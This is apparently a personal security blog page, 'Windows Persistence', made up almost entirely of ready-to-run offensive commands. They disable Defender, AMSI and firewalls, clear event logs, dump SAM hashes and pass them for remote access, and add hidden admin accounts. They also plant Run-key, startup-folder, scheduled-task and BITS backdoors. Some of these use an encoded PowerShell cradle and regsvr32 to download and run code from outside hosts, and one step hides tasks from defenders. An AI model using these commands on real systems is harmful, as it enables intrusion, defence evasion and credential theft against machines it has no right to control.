@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KageHayashi" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Windows Persistence 
+      
+      
+      |
+    
+     KageHayashi
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/t-apple-touch-icon.png">
+    <link rel="icon" href="/images/takeda_white_small.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Rubik&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Kanit&display=swap" rel="stylesheet">
+
+<div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img id="author_photo" src="/images/light.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">KageHayashi</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/cheatsheets/">
+          <a href="/cheatsheets/">Cheat Sheets</a>
+        </li>
+      
+        <li class="nav-item" data-path="/shells/">
+          <a href="/shells/">Shells</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Windows Persistence</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-03-05 20:30:12
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Disable-Antivirus-and-Security"><a href="#Disable-Antivirus-and-Security" class="headerlink" title="Disable Antivirus and Security"></a>Disable Antivirus and Security</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Disable Defender</span></span><br><span class="line"><span class="built_in">sc</span> config WinDefend <span class="built_in">start</span>= disabled</span><br><span class="line"><span class="built_in">sc</span> stop WinDefend</span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Exclude a process / location / extension</span></span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-ExclusionProcess</span> <span class="string">&quot;word.exe&quot;</span>, <span class="string">&quot;vmwp.exe&quot;</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionProcess</span> <span class="string">&#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27;</span></span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionPath</span> C:\</span><br><span class="line"><span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionExtension</span> <span class="string">&quot;exe&quot;</span>, <span class="string">&quot;txt&quot;</span>, <span class="string">&quot;dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable scanning all downloaded files and attachments, disable AMSI (reactive)</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span>; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableIOAVProtection</span> <span class="variable">$true</span></span><br><span class="line"><span class="comment"># Disable AMSI (set to 0 to enable)</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-MpPreference</span> <span class="literal">-DisableScriptScanning</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Windows Defender Security Center</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Services\SecurityHealthService&quot;</span> /v <span class="string">&quot;Start&quot;</span> /t REG_DWORD /d <span class="string">&quot;4&quot;</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Real Time Protection</span></span><br><span class="line">reg delete <span class="string">&quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot;</span> /v <span class="string">&quot;DisableAntiSpyware&quot;</span> /t REG_DWORD /d <span class="string">&quot;1&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot;</span> /v <span class="string">&quot;DisableAntiVirus&quot;</span> /t REG_DWORD /d <span class="string">&quot;1&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+<h1 id="Disable-Firewalls"><a href="#Disable-Firewalls" class="headerlink" title="Disable Firewalls"></a>Disable Firewalls</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Netsh Advfirewall show allprofiles</span><br><span class="line">NetSh Advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip whitelisting</span></span><br><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-Name</span> morph3inbound <span class="literal">-DisplayName</span> morph3inbound <span class="literal">-Enabled</span> True <span class="literal">-Direction</span> Inbound <span class="literal">-Protocol</span> ANY <span class="literal">-Action</span> Allow <span class="literal">-Profile</span> ANY <span class="literal">-RemoteAddress</span> ATTACKER_IP</span><br></pre></td></tr></table></figure>
+
+<h1 id="Clear-Logs"><a href="#Clear-Logs" class="headerlink" title="Clear Logs"></a>Clear Logs</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c wevtutil.exe cl System</span><br><span class="line">cmd.exe /c wevtutil.exe cl Security</span><br></pre></td></tr></table></figure>
+<h1 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam c:\sam</span><br><span class="line">reg save hklm\system c:\system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Transfer SAM and System to attacker then:</span></span><br><span class="line"></span><br><span class="line">samdump2 system sam </span><br><span class="line"><span class="comment"># OR</span></span><br><span class="line">secretsdump.py <span class="literal">-sam</span> sam <span class="literal">-system</span> system LOCAL</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i MACHINE_IP -u Administrator -H &lt;<span class="built_in">hash</span>&gt;</span><br><span class="line">$ psexec.py &lt;domain&gt;/Administrator@MACHINE_IP -hashes &lt;<span class="built_in">hash</span>&gt;</span><br><span class="line">$ crackmapexec smb MACHINE_IP -d &lt;domain&gt; -u Administrator -H &lt;<span class="built_in">hash</span>&gt; -x &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Tampering-With-Accounts"><a href="#Tampering-With-Accounts" class="headerlink" title="Tampering With Accounts"></a>Tampering With Accounts</h1><p>Enable admin account and set password:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user administrator /active:yes</span><br><span class="line">net user administrator &lt;password&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Assign-Group-Memberships"><a href="#Assign-Group-Memberships" class="headerlink" title="Assign Group Memberships"></a>Assign Group Memberships</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; net user kage password123 /add</span><br><span class="line">C:\&gt; net localgroup Administrators kage /add</span><br><span class="line">C:\&gt; net localgroup <span class="string">&quot;Backup Operators&quot;</span> kage /add</span><br><span class="line">C:\&gt; net localgroup <span class="string">&quot;Remote Management Users&quot;</span> kage /add</span><br><span class="line">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Special-Privileges-and-Security-Descriptors"><a href="#Special-Privileges-and-Security-Descriptors" class="headerlink" title="Special Privileges and Security Descriptors"></a>Special Privileges and Security Descriptors</h2><ul>
+<li><strong>SeBackupPrivilege:</strong> The user can read any file in the system, ignoring any DACL in place.</li>
+<li><strong>SeRestorePrivilege:</strong> The user can write any file in the system, ignoring any DACL in place.<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secedit /export /cfg config.inf</span><br><span class="line">secedit /import /cfg config.inf /db config.sdb secedit /configure /db config.sdb /cfg config.inf</span><br><span class="line"><span class="built_in">Set-PSSessionConfiguration</span> <span class="literal">-Name</span> Microsoft.PowerShell <span class="literal">-showSecurityDescriptorUI</span> <span class="comment"># Set perms to user with all access</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="RID-Hijacking"><a href="#RID-Hijacking" class="headerlink" title="RID Hijacking"></a>RID Hijacking</h2><p>msf: <code>post/windows/manage/rid_hijack</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; wmic useraccount get name,sid</span><br><span class="line">C:\tools&gt; PsExec64.exe <span class="literal">-i</span> <span class="literal">-s</span> regedit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert user RID to hex value and find them at HKLM\SAM\SAM\Domains\Account\Users\</span></span><br><span class="line"><span class="comment"># Modify F value to F401 (RID 500 in little-endian) at position 0x30</span></span><br></pre></td></tr></table></figure>
+<h1 id="HKCU-HKLM-Registry-Autoruns"><a href="#HKCU-HKLM-Registry-Autoruns" class="headerlink" title="HKCU &#x2F; HKLM Registry Autoruns"></a>HKCU &#x2F; HKLM Registry Autoruns</h1><p>CMD&#x2F;Powershell:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v NotEvil /t REG_SZ /d <span class="string">&quot;C:\backdoor.exe&quot;</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span> /v NotEvil /t REG_SZ /d <span class="string">&quot;C:\backdoor.exe&quot;</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&quot;</span> /v NotEvil /t REG_SZ /d <span class="string">&quot;C:\backdoor.exe&quot;</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&quot;</span> /v NotEvil /t REG_SZ /d <span class="string">&quot;C:\backdoor.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>SharPersist:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SharPersist <span class="literal">-t</span> reg <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-k</span> <span class="string">&quot;hkcurun&quot;</span> <span class="literal">-v</span> <span class="string">&quot;Test Stuff&quot;</span> <span class="literal">-m</span> add</span><br><span class="line">SharPersist <span class="literal">-t</span> reg <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-k</span> <span class="string">&quot;hkcurun&quot;</span> <span class="literal">-v</span> <span class="string">&quot;Test Stuff&quot;</span> <span class="literal">-m</span> add <span class="literal">-o</span> env</span><br><span class="line">SharPersist <span class="literal">-t</span> reg <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-k</span> <span class="string">&quot;logonscript&quot;</span> <span class="literal">-m</span> add</span><br></pre></td></tr></table></figure>
+
+<h1 id="Startup-Folder"><a href="#Startup-Folder" class="headerlink" title="Startup Folder"></a>Startup Folder</h1><p><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> - user specific<br><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> - all users will run</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">gc</span> C:\Users\kage\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat</span><br><span class="line"><span class="built_in">start</span> /b C:\Users\kage\AppData\Local\Temp\backdoor.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SharPersist <span class="literal">-t</span> startupfolder <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="operator">-f</span> <span class="string">&quot;Some File&quot;</span> <span class="literal">-m</span> add</span><br><span class="line">SharPersist <span class="literal">-t</span> startupfolder <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBhAHMAaABpAHIAYQAuAGMAbwBtAC8AYQAiACkAKQA=&quot;</span> <span class="operator">-f</span> <span class="string">&quot;Updater&quot;</span> <span class="literal">-m</span> add</span><br></pre></td></tr></table></figure>
+<h1 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h1><p>Pinned:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\kage&gt; <span class="variable">$str</span> = <span class="string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;http://ashira.com/a&quot;))&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\kage&gt; [<span class="type">System.Convert</span>]::ToBase64String([<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$str</span>))</span><br><span class="line">SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBhAHMAaABpAHIAYQAuAGMAbwBtAC8AYQAiACkAKQA=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Every minute</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /tn <span class="string">&quot;NotEvil&quot;</span> /tr <span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBhAHMAaABpAHIAYQAuAGMAbwBtAC8AYQAiACkAKQA=&quot;</span></span><br><span class="line"></span><br><span class="line">SharPersist <span class="literal">-t</span> schtask <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBhAHMAaABpAHIAYQAuAGMAbwBtAC8AYQAiACkAKQA=&quot;</span> <span class="literal">-n</span> <span class="string">&quot;Updater&quot;</span> <span class="literal">-m</span> add <span class="literal">-o</span> hourly</span><br></pre></td></tr></table></figure>
+
+<p>CMD:<br><code>/sc &lt;scheduletype&gt;</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MINUTE - Specifies the number of minutes before the task should run.</span><br><span class="line">HOURLY - Specifies the number of hours before the task should run.</span><br><span class="line">DAILY - Specifies the number of days before the task should run.</span><br><span class="line">WEEKLY Specifies the number of weeks before the task should run.</span><br><span class="line">MONTHLY - Specifies the number of months before the task should run.</span><br><span class="line">ONCE - Specifies that that task runs once at a specified date and time.</span><br><span class="line">ONSTART - Specifies that the task runs every time the system starts. You can specify a <span class="built_in">start</span> date, or run the task the next time the system starts.</span><br><span class="line">ONLOGON - Specifies that the task runs whenever a user (any user) logs on. You can specify a date, or run the task the next time the user logs on.</span><br><span class="line">ONIDLE - Specifies that the task runs whenever the system is idle <span class="keyword">for</span> a specified period of time. You can specify a date, or run the task the next time the system is idle.</span><br><span class="line">ONEVENT - Specifies that the task runs based on an event that matches information from the system event log including the EventID.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Run every minute</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /tn <span class="string">&quot;NotEvil&quot;</span> /tr C:\revshell.exe</span><br><span class="line">schtasks /create /<span class="built_in">sc</span> minute /mo <span class="number">1</span> /tn <span class="string">&quot;NotEvil&quot;</span> /tr C:\revshell.exe /ru <span class="string">&quot;SYSTEM&quot;</span> <span class="comment"># run as SYSTEM</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the scheduled tasks to run once at 00.00</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> ONCE /st <span class="number">00</span>:<span class="number">00</span> /tn <span class="string">&quot;Device-Synchronize&quot;</span> /tr C:\Temp\revshell.exe</span><br><span class="line"><span class="comment"># Force run it now !</span></span><br><span class="line">schtasks /run /tn <span class="string">&quot;Device-Synchronize&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Launch an executable by calling the ShellExec_RunDLL function.</span></span><br><span class="line">SCHTASKS /Change /tn <span class="string">&quot;\Microsoft\Windows\PLA\Server Manager Performance Monitor&quot;</span> /TR <span class="string">&quot;C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat&quot;</span> /RL HIGHEST /RU <span class="string">&quot;&quot;</span> /ENABLE</span><br></pre></td></tr></table></figure>
+
+<p>Powershell:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$A</span> = <span class="built_in">New-ScheduledTaskAction</span> <span class="literal">-Execute</span> <span class="string">&quot;cmd.exe&quot;</span> <span class="literal">-Argument</span> <span class="string">&quot;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$T</span> = <span class="built_in">New-ScheduledTaskTrigger</span> <span class="literal">-AtLogOn</span> <span class="literal">-User</span> <span class="string">&quot;Kage&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$P</span> = <span class="built_in">New-ScheduledTaskPrincipal</span> <span class="string">&quot;Kage&quot;</span></span><br><span class="line"><span class="comment"># or for SYSTEM</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$P</span> = <span class="built_in">New-ScheduledTaskPrincipal</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">-RunLevel</span> Highest</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$S</span> = <span class="built_in">New-ScheduledTaskSettingsSet</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$D</span> = <span class="built_in">New-ScheduledTask</span> <span class="literal">-Action</span> <span class="variable">$A</span> <span class="literal">-Trigger</span> <span class="variable">$T</span> <span class="literal">-Principal</span> <span class="variable">$P</span> <span class="literal">-Settings</span> <span class="variable">$S</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Register-ScheduledTask</span> Backdoor <span class="literal">-InputObject</span> <span class="variable">$D</span></span><br></pre></td></tr></table></figure>
+
+<p>SharPersist:</p>
+<ul>
+<li><code>-t</code> is the desired persistence technique.</li>
+<li><code>-c</code> is the command to execute.</li>
+<li><code>-a</code> are any arguments for that command.</li>
+<li><code>-n</code> is the name of the task.</li>
+<li><code>-m</code> is to add the task (you can also <code>remove</code>, <code>check</code> and <code>list</code>).</li>
+<li><code>-o</code> is the task frequency (<code>daily</code>, <code>hourly</code>, <code>logon</code>, defaults to daily).<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Add to a current scheduled task</span></span><br><span class="line">SharPersist <span class="literal">-t</span> schtaskbackdoor <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-n</span> <span class="string">&quot;Something Cool&quot;</span> <span class="literal">-m</span> add</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add new task</span></span><br><span class="line">SharPersist <span class="literal">-t</span> schtask <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-n</span> <span class="string">&quot;Some Task&quot;</span> <span class="literal">-m</span> add</span><br><span class="line">SharPersist <span class="literal">-t</span> schtask <span class="literal">-c</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-a</span> <span class="string">&quot;/c calc.exe&quot;</span> <span class="literal">-n</span> <span class="string">&quot;Some Task&quot;</span> <span class="literal">-m</span> add <span class="literal">-o</span> hourly</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Making-Our-Tasks-Invisible"><a href="#Making-Our-Tasks-Invisible" class="headerlink" title="Making Our Tasks Invisible"></a>Making Our Tasks Invisible</h2><p>Delete task <strong>Security Descriptor (SD)</strong>. Must have SYSTEM privs.</p>
+<p><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe <span class="literal">-s</span> <span class="literal">-i</span> regedit <span class="comment"># Open regedit with SYSTEM priv</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the task in the tree and delete it&#x27;s SD value</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="BITS-Jobs"><a href="#BITS-Jobs" class="headerlink" title="BITS Jobs"></a>BITS Jobs</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor <span class="string">&quot;http://10.10.10.10/evil.exe&quot;</span>  <span class="string">&quot;C:\tmp\evil.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v1</span></span><br><span class="line">bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL</span><br><span class="line">bitsadmin /SetMinRetryDelay <span class="string">&quot;backdoor&quot;</span> <span class="number">60</span></span><br><span class="line">bitsadmin /resume backdoor</span><br><span class="line"></span><br><span class="line"><span class="comment"># v2 - exploit/multi/script/web_delivery</span></span><br><span class="line">bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe <span class="string">&quot;/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll&quot;</span></span><br><span class="line">bitsadmin /resume backdoor</span><br></pre></td></tr></table></figure>
+
